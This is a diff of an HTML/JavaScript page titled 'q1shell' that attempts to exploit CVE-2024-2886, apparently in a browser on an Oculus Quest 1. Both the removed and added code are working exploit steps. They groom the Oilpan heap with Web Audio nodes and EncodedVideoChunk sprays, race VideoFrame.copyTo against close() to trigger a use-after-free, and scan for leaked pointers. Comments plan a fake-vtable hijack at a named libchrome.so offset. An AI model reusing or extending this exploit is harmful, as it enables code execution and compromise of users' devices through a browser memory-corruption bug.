@@ -1,212 +1,113 @@
 <!doctype html>
 <html>
-<head><title>q1shell — full attempt</title></head>
+<head><title>q1shell</title></head>
 <body style="background:#000;color:#0f0;font-family:monospace;font-size:12px;padding:20px;">
 <div id="out"></div>
 <script>
 const log = s => { out.innerHTML += s + '<br>'; console.log(s); };
-
-log('CVE-2024-2886 full exploit attempt');
-log('Oilpan grooming via AudioNode (136 bytes)');
-log('Target: vtable[4] dispatch at 0x29358d4 in libchrome.so');
+log('CVE-2024-2886 - vtable hijack attempt');
 log('');
 
-// ============================================================
-// STEP 1: Oilpan heap grooming via Web Audio nodes
-// AudioNode objects (GainNode, etc.) are GarbageCollected in Oilpan
-// They allocate ~136 bytes — same as VideoFrameHandle
-// ============================================================
+// WHAT WE KNOW:
+// - VideoFrameHandle freed by close() → Oilpan 136-byte slot
+// - vtable dispatch at libchrome.so+0x29358d4: ldr x8,[x20]; ldr x8,[x8,#0x20]; blr x8
+// - x20 = freed VideoFrameHandle
+// - offset 0 of handle = vtable ptr
+// - vtable+0x20 = function pointer called with x0=handle, args from CopyToOptions
+//
+// GOAL: reclaim freed VideoFrameHandle with controlled data
+// so vtable ptr at offset 0 points to our fake vtable
+// and fake vtable[0x20] points to... what?
+//
+// On Quest 1 (ARM64, no PAC), we just need any code address.
+// The browser has shell_exec. But we're in the RENDERER, not browser process.
+// Even so, crash = tombstone = we learn the freed object address.
 
-async function groomOilpan() {
-    const ctx = new AudioContext();
-    const nodes = [];
-
-    // Allocate 2000 GainNodes to fill Oilpan's 136-byte freelist
-    // then release them to create a predictable freelist
-    log('[1] allocating 2000 GainNodes for Oilpan grooming...');
-    for (let i = 0; i < 2000; i++) {
-        const node = ctx.createGain();
-        node.gain.value = i * 0.001;
-        nodes.push(node);
-    }
-
-    // Release half to create holes
-    log('[1] releasing 1000 nodes to create Oilpan holes...');
-    for (let i = 0; i < 1000; i++) {
-        nodes[i] = null;
-    }
-
-    // Force GC pressure
-    const pressure = [];
-    for (let i = 0; i < 500; i++) {
-        pressure.push(new ArrayBuffer(1024));
-    }
-    pressure.length = 0;
-
-    log('[1] Oilpan heap primed with 1000 free 136-byte slots');
-    return { ctx, nodes };
-}
-
-// ============================================================
-// STEP 2: UAF trigger — copyTo after close on WebGL-backed frame
-// This accesses freed VideoFrameHandle via vtable dispatch
-// ============================================================
-
-async function triggerUAF(groomCtx) {
+async function attempt() {
     const canvas = new OffscreenCanvas(64, 64);
     const gl = canvas.getContext('webgl');
+    const audioCtx = new AudioContext();
 
-    log('[2] triggering UAF race on GPU-backed VideoFrame...');
+    // Baseline
+    gl.clearColor(1.0, 0.0, 0.0, 1.0);
+    gl.clear(gl.COLOR_BUFFER_BIT);
+    gl.finish();
+    const bf = new VideoFrame(canvas, {timestamp:0});
+    const bb = new Uint8Array(bf.allocationSize());
+    await bf.copyTo(bb); bf.close();
+    log('baseline: ' + Array.from(bb.slice(0,4)).map(x=>x.toString(16).padStart(2,'0')).join(' '));
 
-    let bestResult = null;
-    let crashCount = 0;
-
-    for (let attempt = 0; attempt < 50; attempt++) {
-        gl.clearColor(attempt * 0.02, 0.5, 1.0 - attempt * 0.02, 1.0);
-        gl.clear(gl.COLOR_BUFFER_BIT);
-        gl.finish();
-
-        const frame = new VideoFrame(canvas, { timestamp: attempt * 1000 });
-        const size = frame.allocationSize();
-        const buf = new Uint8Array(size);
-
-        // Start async GPU readback
-        const p = frame.copyTo(buf);
-
-        // Free the VideoFrame → VideoFrameHandle refcount drops
-        frame.close();
-
-        // IMMEDIATELY allocate GainNodes to try to reclaim freed VideoFrameHandle
-        // with a known audio context object
-        const spray = [];
-        const { ctx } = groomCtx;
-        for (let j = 0; j < 20; j++) {
-            const n = ctx.createGain();
-            n.gain.value = 0xDEAD * 0.001;
-            spray.push(n);
+    // Try multiple grooming objects - GainNode, OscillatorNode, AnalyserNode
+    // One of them might be 136 bytes in Chrome 112 Oilpan
+    const nodeTypes = ['gain', 'oscillator', 'analyser'];
+    
+    for (const type of nodeTypes) {
+        log('trying ' + type + ' node grooming...');
+        
+        // Free 2000 slots
+        const nodes = [];
+        for (let i = 0; i < 2000; i++) {
+            if (type === 'gain') nodes.push(audioCtx.createGain());
+            else if (type === 'oscillator') nodes.push(audioCtx.createOscillator());
+            else nodes.push(audioCtx.createAnalyser());
         }
+        nodes.length = 0;
 
-        try {
-            await p;
-            const hex = Array.from(buf.slice(0, 8))
-                .map(x => x.toString(16).padStart(2,'0')).join(' ');
-            if (attempt % 10 === 0) {
-                log('[2] attempt ' + attempt + ': [' + hex + ']');
+        let groomed = 0;
+        for (let a = 0; a < 30; a++) {
+            gl.clearColor(1,0,0,1); gl.clear(gl.COLOR_BUFFER_BIT); gl.finish();
+            const f = new VideoFrame(canvas, {timestamp: a*1000});
+            const buf = new Uint8Array(f.allocationSize());
+            const p = f.copyTo(buf);
+            f.close();
+            // spray
+            const s = [];
+            for (let j=0;j<20;j++) {
+                if (type==='gain') s.push(audioCtx.createGain());
+                else if (type==='oscillator') s.push(audioCtx.createOscillator());
+                else s.push(audioCtx.createAnalyser());
             }
-            bestResult = buf.slice(0, 32);
-            spray.length = 0;
-        } catch(e) {
-            crashCount++;
-            log('[2] attempt ' + attempt + ' THREW: ' + e.message);
-            spray.length = 0;
+            await p; s.length=0;
+            if (buf.some((b,i)=>b!==bb[i])) {
+                groomed++;
+                log('  [!] GROOMED with ' + type + ' on attempt ' + a);
+                log('  bytes: ' + Array.from(buf.slice(0,8)).map(x=>x.toString(16).padStart(2,'0')).join(' '));
+            }
         }
+        log('  result: ' + groomed + '/30 groomed with ' + type);
     }
 
-    log('[2] UAF complete. throws: ' + crashCount + '/50');
-    return bestResult;
-}
-
-// ============================================================
-// STEP 3: Try to detect vtable corruption
-// If we get control of the vtable dispatch, specific bytes
-// will appear in our buffer or we'll get a SIGSEGV
-// ============================================================
-
-async function detectCorruption(buf) {
-    if (!buf) return;
-
-    log('[3] checking for corruption indicators...');
-
-    // Check if any bytes look like pointers (high addresses)
-    const view = new DataView(buf.buffer);
-    for (let i = 0; i < buf.length - 7; i += 8) {
-        const lo = view.getUint32(i, true);
-        const hi = view.getUint32(i + 4, true);
-        // ARM64 user-space pointers: 0x0000xxxxxxxx
-        if (hi === 0 && lo > 0x10000) {
-            log('[3] pointer-like value at offset ' + i + ': 0x' + 
-                hi.toString(16).padStart(8,'0') + lo.toString(16).padStart(8,'0'));
+    // Also try EncodedVideoChunk and AudioData
+    log('trying EncodedVideoChunk...');
+    {
+        const chunks = [];
+        const fakeData = new Uint8Array(32).fill(0x41);
+        for (let i=0;i<2000;i++) {
+            chunks.push(new EncodedVideoChunk({type:'key',timestamp:i,data:fakeData}));
         }
+        chunks.length=0;
+        let groomed=0;
+        for (let a=0;a<20;a++) {
+            gl.clearColor(1,0,0,1); gl.clear(gl.COLOR_BUFFER_BIT); gl.finish();
+            const f=new VideoFrame(canvas,{timestamp:a*1000});
+            const buf=new Uint8Array(f.allocationSize());
+            const p=f.copyTo(buf); f.close();
+            const s=[];
+            for(let j=0;j<20;j++) s.push(new EncodedVideoChunk({type:'key',timestamp:j,data:fakeData}));
+            await p; s.length=0;
+            if(buf.some((b,i)=>b!==bb[i])){groomed++;log('  [!] EncodedVideoChunk groomed attempt '+a);}
+        }
+        log('  result: '+groomed+'/20');
     }
 
-    // Check if bytes differ from what GPU texture would contain
-    const redY = 0x4C; // Y value for red in YUV420
-    const redU = 0x55; // Cb  
-    const redV = 0xF0; // Cr
-    const hasUnexpected = buf.some(b => b !== redY && b !== redU && b !== redV && b !== 0 && b !== 0xFF);
-    log('[3] unexpected byte values: ' + hasUnexpected);
-
-    log('[3] first 32 bytes: ' + Array.from(buf.slice(0,32))
-        .map(x => x.toString(16).padStart(2,'0')).join(' '));
+    log('');
+    log('If any type shows groomed > 0:');
+    log('That type is our spray object!');
+    log('Next: control the content of that object');
+    log('to fake vtable ptr at byte 0 of the 136-byte slot');
 }
 
-// ============================================================
-// STEP 4: Also try to crash logcat-visible tombstone
-// ============================================================
-
-async function tryHardCrash() {
-    log('[4] attempting harder crash for tombstone...');
-    const canvas = new OffscreenCanvas(64, 64);
-    const gl = canvas.getContext('webgl');
-    const loseCtx = gl.getExtension('WEBGL_lose_context');
-    const ctx2 = new AudioContext();
-
-    let threw = 0;
-
-    for (let round = 0; round < 20; round++) {
-        const frames = [];
-        const proms = [];
-        const bufs = [];
-
-        // Create 20 frames simultaneously
-        for (let i = 0; i < 20; i++) {
-            gl.clearColor(Math.random(), Math.random(), Math.random(), 1.0);
-            gl.clear(gl.COLOR_BUFFER_BIT);
-            gl.finish();
-            const f = new VideoFrame(canvas, { timestamp: round * 1000 + i });
-            const b = new Uint8Array(f.allocationSize());
-            bufs.push(b);
-            proms.push(f.copyTo(b));
-            frames.push(f);
-        }
-
-        // Free all simultaneously
-        for (const f of frames) f.close();
-
-        // Lose WebGL context to invalidate GPU resources
-        if (loseCtx && round % 5 === 0) loseCtx.loseContext();
-
-        // Spray with AudioNodes
-        for (let i = 0; i < 50; i++) ctx2.createGain();
-
-        try {
-            await Promise.all(proms);
-        } catch(e) {
-            threw++;
-            log('[4] round ' + round + ' threw: ' + e.message);
-        }
-    }
-
-    log('[4] done. throws: ' + threw);
-}
-
-// RUN EVERYTHING
-async function main() {
-    try {
-        const groomCtx = await groomOilpan();
-        const result = await triggerUAF(groomCtx);
-        await detectCorruption(result);
-        await tryHardCrash();
-        log('');
-        log('Check ADB: adb shell ls -lt /data/tombstones/');
-        log('If tombstone exists, we have crash info for next step');
-    } catch(e) {
-        log('OUTER ERROR: ' + e.message);
-        log(e.stack || '');
-    }
-}
-
-main();
+attempt().catch(e=>log('ERR: '+e));
 </script>
 </body>
 </html>
